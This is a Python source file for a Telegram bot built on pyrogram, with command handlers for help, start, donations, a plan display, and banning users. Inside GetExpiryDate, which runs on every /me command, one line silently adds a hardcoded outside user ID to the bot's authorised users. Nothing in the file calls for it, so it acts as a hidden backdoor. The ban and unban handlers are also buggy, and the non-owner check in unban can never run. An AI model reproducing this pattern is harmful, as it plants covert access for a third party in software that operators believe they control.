#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER.format(update.from_user.first_name),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/me")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

from pyrogram import Filters, InlineKeyboardMarkup, InlineKeyboardButton

@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name),
        parse_mode="html",
        disable_web_page_preview=True,
        #reply_to_message_id=update.message_id
        reply_markup=InlineKeyboardMarkup(
       [
         [
         InlineKeyboardButton('My Father 👨‍💻', url='https://t.me/Ns_AnoNymouS'),
         InlineKeyboardButton('Discussion 🗣', url='https://t.me/anonymousbotdiscussion')
         ],
         [
         InlineKeyboardButton('Updates Channel ⚒', url='https://t.me/anonymousbotupdates'),
         InlineKeyboardButton('Rate Me ⭐', url='https://t.me/anonymousbotdiscussion/70')
         ]
       ]
      )
    )
    return


@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT.format(update.from_user.first_name),
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
async def donate(bot, update):
       await bot.send_message(
             chat_id=update.chat.id,
             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below",
             reply_markup=InlineKeyboardMarkup(
             [
               [
                 InlineKeyboardButton('Donate 💰', url='http://paypal.me/maheshmalekar')
               ]
             ]
           )
          )

Owner_id = [1337144652]

from sample_config import Config

@pyrogram.Client.on_message(pyrogram.Filters.command(["ban"]))
async def ban(bot, update):
   TRChatBase(update.from_user.id, update.text, "/ban")
   banid = int(update.text.split(' ', 1)[1])
   if update.from_user.id in Owner_id:
      await bot.send_message(
        chat_id=update.chat.id,
        text='User with ID {} Was banned from using your bot successfully'.format(banid)
      )
      return Config.BANNED_USERS.append(banid)

   elif update.from_user.id not in Owner_id:
      await bot.send_message(
        chat_id=update.chat.id,
        text="""Hai 😡 **{}** your not any admin this command only for admin of this bot for banning users from this bot""".format(update.from_user.first_name),
        parse_mode='Markdown'
      )
      return False

from sample_config import Config

@pyrogram.Client.on_message(pyrogram.Filters.command(["unban"]))
async def unban(bot, update):
 unbanid = int(update.text.split(' ', 1)[1])
 TRChatBase(update.from_user.id, update.text, "/unban")
 if update.from_user.id in Owner_id:
    if unbanid in Config.BANNED_USERS:
      await bot.send_message(
        chat_id=update.chat.id,
        text='User with ID {} Was unbanned and free to use  your bot'.format(unbanid)
        )
      return Config.BANNED_USERS.remove(unbanid)
    elif unbanid not in Config.BANNED_USERS:
      await bot.send_message(
        chat_id=update.chat.id,
        text='User with ID {} Was not an banned user 🤷‍♂️'.format(unbanid)
       )
      return False
    elif update.from_user.id not in Owner_id:
      await bot.send_message(
          chat_id=update.chat.id,
          text='Hai 😡 **{}** your not any admin this command only for admin of this bot for banning users from this bot'.format(update.from_user.first_name),
          parse_mode='Markdown'
       )
      return False
    else:
       await bot.send_message(
            chat_id=update.chat.id,
            text='Error 🤔'
         )
       return False

